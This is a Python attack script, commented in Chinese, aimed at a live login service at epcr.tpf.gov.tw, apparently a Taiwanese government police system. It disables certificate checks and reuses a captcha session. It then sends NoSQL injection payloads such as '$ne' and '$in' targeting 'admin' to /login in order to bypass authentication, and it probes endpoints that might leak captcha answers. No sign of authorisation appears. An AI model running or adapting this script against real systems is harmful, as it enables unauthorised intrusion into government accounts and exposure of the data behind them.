#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Captcha 会话流程测试:
 1) GET /captcha 拿 connect.sid
 2) 用同一 session POST /login (NoSQL + 各种 captcha 值)
 3) 判断 captcha 是否真正校验 (错误 captcha vs 无 captcha 是否有差异)
 4) 尝试 $in 单用户 + 字符串 password, 定位 500 TypeError 能否变 200
"""
import json, ssl, urllib.request, urllib.error, time, http.cookiejar, re

CTX=ssl.create_default_context(); CTX.check_hostname=False; CTX.verify_mode=ssl.CERT_NONE
BASE="https://epcr.tpf.gov.tw:4004"

def new_session():
    cj=http.cookiejar.CookieJar()
    opener=urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj), urllib.request.HTTPSHandler(context=CTX))
    return opener, cj

def get_captcha(opener):
    r=opener.open(BASE+"/captcha?t=%d"%int(time.time()), timeout=12)
    data=r.read()
    ctype=r.getheader("Content-Type")
    return len(data), ctype, r.status

def login(opener, body):
    data=json.dumps(body).encode()
    req=urllib.request.Request(BASE+"/login",data=data,method="POST",
        headers={"Content-Type":"application/json","User-Agent":"Mozilla/5.0"})
    try:
        r=opener.open(req,timeout=12); return r.status, r.read().decode("utf-8","replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8","replace")
    except Exception as e:
        return None, repr(e)

# 1) 同一 session: 先取 captcha, 再 NoSQL login (带/不带 captcha 字段)
print("=== 会话内 captcha 流程 ===")
opener,cj=new_session()
n,ct,st=get_captcha(opener)
print(f"captcha: status={st} type={ct} bytes={n}")
print(f"cookies: {[(c.name) for c in cj]}")

tests=[
 ("no-captcha-field",      {"username":{"$ne":None},"password":{"$ne":None},"domain":"AUTH_SERVER"}),
 ("captcha='1'",           {"username":{"$ne":None},"password":{"$ne":None},"captcha":"1","domain":"AUTH_SERVER"}),
 ("captcha='1234'",        {"username":{"$ne":None},"password":{"$ne":None},"captcha":"1234","domain":"AUTH_SERVER"}),
 ("captcha empty",         {"username":{"$ne":None},"password":{"$ne":None},"captcha":"","domain":"AUTH_SERVER"}),
 ("in-single+strpass",     {"username":{"$in":["admin"]},"password":"admin","captcha":"1","domain":"AUTH_SERVER"}),
 ("in-single+nepass",      {"username":{"$in":["admin"]},"password":{"$ne":None},"captcha":"1","domain":"AUTH_SERVER"}),
]
for n2,b in tests:
    code,body=login(opener,b)
    print(f"  [{n2:22s}] -> {code} | {body[:70]}")
    time.sleep(0.2)

# 2) 检查是否有 captcha 答案泄露端点
print("\n=== 探测 captcha 相关端点 ===")
for path in ["/captcha", "/captcha/1", "/captcha.json", "/getCaptcha", "/checkCaptcha", "/api/captcha"]:
    try:
        r=opener.open(BASE+path, timeout=8)
        print(f"  GET {path:20s} -> {r.status} len={len(r.read())}")
    except urllib.error.HTTPError as e:
        print(f"  GET {path:20s} -> {e.code} {e.read().decode('utf-8','replace')[:40]}")
    except Exception as e:
        print(f"  GET {path:20s} -> ERR {e}")
    time.sleep(0.1)

print("\nDONE")
